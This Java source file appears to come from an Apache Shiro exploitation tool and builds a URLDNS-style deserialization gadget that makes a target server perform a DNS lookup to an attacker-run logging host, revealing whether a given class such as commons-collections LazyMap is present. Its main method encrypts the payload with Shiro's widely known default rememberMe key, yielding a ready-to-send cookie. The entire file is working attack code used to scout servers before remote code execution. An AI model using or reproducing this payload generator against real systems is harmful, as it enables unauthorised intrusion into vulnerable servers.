package com.y5neko.shiroexp.gadget;

import com.y5neko.shiroexp.misc.Tools;
import javassist.CtClass;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.Base64;
import java.util.HashMap;

/**
 * Thanks to <a href="https://mp.weixin.qq.com/s?__biz=Mzg3NjA4MTQ1NQ==&mid=2247484178&idx=1&sn=228ccc3d624f2d64a6c1d51555c42eea&chksm=cf36fb52f8417244ea608ea14da45b876548617864179c8da6df46010bed78aa41c4a2277cb8&scene=58&subscene=0#rd">c0ny1</a>
 */
public class FindClassByURLDNS {
    /**
     * 反射设置字段值
     */
    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    /**
     * 生成payload
     * @param url 自定义URL
     * @param clazzName 要探测的目标类名
     * @return payload
     * @throws Exception 异常
     */
    public static byte[] genPayload(String url, String clazzName) throws Exception {
        // 通过实例化URLStreamHandler子类自定义handler，从而实现重写
        URLStreamHandler handler = new URLStreamHandler() {
            @Override
            protected URLConnection openConnection(URL u) {
                return null;
            }
            @Override
            protected synchronized InetAddress getHostAddress(URL u){
                return null;
            }
        };

        HashMap ht = new HashMap();
        URL u = new URL(null, url, handler);

        // 获取目标类的 Class 对象
        // 如果本地存在该类，直接使用 Class.forName() 获取
        // 如果本地不存在该类，使用 Javassist 创建（只创建一次，后续会复用）
        Class clazz = getClass(clazzName);

        // 以URL对象为key，以目标类Class为value
        ht.put(u, clazz);
        setFieldValue(u, "hashCode", -1);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(ht);
        oos.close();
        return baos.toByteArray();
    }

    /**
     * 获取目标类的 Class 对象
     * @param className 类名
     * @return Class对象
     */
    private static Class getClass(String className) throws Exception {
        try {
            // 尝试使用 Class.forName() 加载已存在的类
            return Class.forName(className);
        } catch (ClassNotFoundException e) {
            // 本地不存在该类，使用 Javassist 创建
            return createClass(className);
        }
    }

    /**
     * 使用 Javassist 创建类（带缓存机制，避免重复创建）
     */
    private static final java.util.Map<String, Class> classCache = new java.util.HashMap<>();

    private static Class createClass(String className) throws Exception {
        // 检查缓存
        if (classCache.containsKey(className)) {
            return classCache.get(className);
        }

        // 使用新的 ClassPool 实例，避免污染默认 ClassPool
        javassist.ClassPool pool = new javassist.ClassPool(true);
        pool.appendSystemPath();

        CtClass ctClass = pool.makeClass(className);
        Class clazz = ctClass.toClass();
        ctClass.defrost();

        // 缓存类对象
        classCache.put(className, clazz);

        return clazz;
    }

    public static void main(String[] args) {
        try {
            byte[] payload = genPayload("http://test.573651c51f.ddns.1433.eu.org", "org.apache.commons.collections.map.LazyMap");

            // 获取恶意类字节码
            String data = Base64.getEncoder().encodeToString(payload);
            String result = Tools.CBC_Encrypt("kPH+bIxk5D2deZiIxcaaaA==", data);
            System.out.println(result);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
